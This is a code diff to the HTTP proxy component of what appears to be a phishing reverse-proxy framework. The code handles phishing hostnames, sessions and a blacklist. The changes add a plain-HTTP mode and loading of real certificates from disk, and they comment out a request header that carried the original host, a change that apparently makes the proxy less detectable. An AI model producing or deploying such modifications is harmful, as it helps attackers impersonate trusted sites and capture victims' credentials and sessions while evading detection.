@@ -82,6 +82,9 @@ type HttpProxy struct {
 	auto_filter_mimes []string
 	ip_mtx            sync.Mutex
 	session_mtx       sync.Mutex
+	HttpServer	  bool
+	CertFilePath	  string
+	KeyFilePath	  string
 }
 
 type ProxySession struct {
@@ -106,7 +109,7 @@ func SetJSONVariable(body []byte, key string, value interface{}) ([]byte, error)
 	return newBody, nil
 }
 
-func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
+func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool, httpServer bool, certFilePath string, keyFilePath string) (*HttpProxy, error) {
 	p := &HttpProxy{
 		Proxy:             goproxy.NewProxyHttpServer(),
 		Server:            nil,
@@ -121,6 +124,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		ip_whitelist:      make(map[string]int64),
 		ip_sids:           make(map[string]string),
 		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
+		HttpServer:	   httpServer,
+		CertFilePath:	   certFilePath,
+		KeyFilePath:	   keyFilePath,
 	}
 
 	p.Server = &http.Server{
@@ -146,8 +152,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 	p.Proxy.Verbose = false
 
+	var urlScheme = "https"
+	if httpServer {
+		urlScheme = "http"
+	}
+
 	p.Proxy.NonproxyHandler = http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
-		req.URL.Scheme = "https"
+		req.URL.Scheme = urlScheme
 		req.URL.Host = req.Host
 		p.Proxy.ServeHTTP(w, req)
 	})
@@ -466,7 +477,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						return p.blockRequest(req)
 					}
 				}
-				req.Header.Set(p.getHomeDir(), o_host)
+				//req.Header.Set(p.getHomeDir(), o_host)
 
 				if ps.SessionId != "" {
 					if s, ok := p.sessions[ps.SessionId]; ok {
@@ -1555,7 +1566,14 @@ func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (
 				}
 			}
 
-			cert, err := p.crt_db.getSelfSignedCertificate(hostname, phish_host, port)
+			//cert, err := p.crt_db.getSelfSignedCertificate(hostname, phish_host, port)
+			// declare cert as *tls.Certificate
+			var cert *tls.Certificate
+			if p.CertFilePath != "" && p.KeyFilePath != "" {
+				cert, err = p.crt_db.getCertificateFromDisk(hostname, phish_host, port, p.CertFilePath, p.KeyFilePath)
+			} else {
+				cert, err = p.crt_db.getSelfSignedCertificate(hostname, phish_host, port)
+			}
 			if err != nil {
 				log.Error("http_proxy: %s", err)
 				return nil, err
@@ -1620,12 +1638,17 @@ func (p *HttpProxy) httpsWorker() {
 			c.SetReadDeadline(now.Add(httpReadTimeout))
 			c.SetWriteDeadline(now.Add(httpWriteTimeout))
 
-			tlsConn, err := vhost.TLS(c)
+			// tlsConn, err := vhost.TLS(c)
+			httpSConn, err := vhost.TLS(c)
 			if err != nil {
 				return
 			}
 
-			hostname := tlsConn.Host()
+			//hostname := tlsConn.Host()
+			hostname := httpSConn.Host()
+			if strings.Contains(hostname, ":") {
+				hostname = strings.Split(hostname, ":")[0]
+			}
 			if hostname == "" {
 				return
 			}
@@ -1647,7 +1670,8 @@ func (p *HttpProxy) httpsWorker() {
 				Header:     make(http.Header),
 				RemoteAddr: c.RemoteAddr().String(),
 			}
-			resp := dumbResponseWriter{tlsConn}
+			//resp := dumbResponseWriter{tlsConn}
+			resp := dumbResponseWriter{httpSConn}
 			p.Proxy.ServeHTTP(resp, req)
 		}(c)
 	}
